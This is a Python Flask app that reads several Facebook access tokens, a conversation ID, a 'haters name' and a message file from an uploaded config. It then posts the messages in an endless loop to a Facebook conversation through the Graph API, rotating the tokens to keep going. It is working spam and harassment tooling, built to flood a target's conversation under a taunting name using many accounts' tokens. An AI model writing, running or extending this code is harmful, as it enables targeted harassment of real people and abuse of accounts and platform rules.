from flask import Flask, render_template, request, jsonify
import threading, time, requests, os

app = Flask(__name__, template_folder="templates")

running = False
task_thread = None

def send_messages(config):
    global running
    running = True

    tokens = config["TOKEN"].split("|")
    convo_id = config["CONVO_ID"]
    haters_name = config["HATERS_NAME"]
    delay = int(config["TIME_DELAY"])
    np_file = config["NP_FILE"]

    if not os.path.exists(np_file):
        print(f"[x] Message file not found: {np_file}")
        return

    with open(np_file, "r", encoding="utf-8") as f:
        messages = [m.strip() for m in f.readlines() if m.strip()]

    count = 0
    while running:
        for i, msg in enumerate(messages):
            if not running:
                break
            token = tokens[i % len(tokens)]
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}"
            payload = {"access_token": token, "message": f"{haters_name} {msg}"}
            r = requests.post(url, data=payload)
            count += 1
            print(f"[+] Sent {count}: {haters_name} {msg} | Status: {r.status_code}")
            time.sleep(delay)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/start", methods=["POST"])
def start_task():
    global task_thread, running
    if running:
        return jsonify({"status": "Already running!"})

    config_file = request.files["config"]
    config_text = config_file.read().decode("utf-8")

    config = {}
    for line in config_text.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            config[key.strip()] = value.strip()

    task_thread = threading.Thread(target=send_messages, args=(config,))
    task_thread.start()

    return jsonify({"status": "Task started successfully"})


@app.route("/stop", methods=["POST"])
def stop_task():
    global running
    running = False
    return jsonify({"status": "Task stopped"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
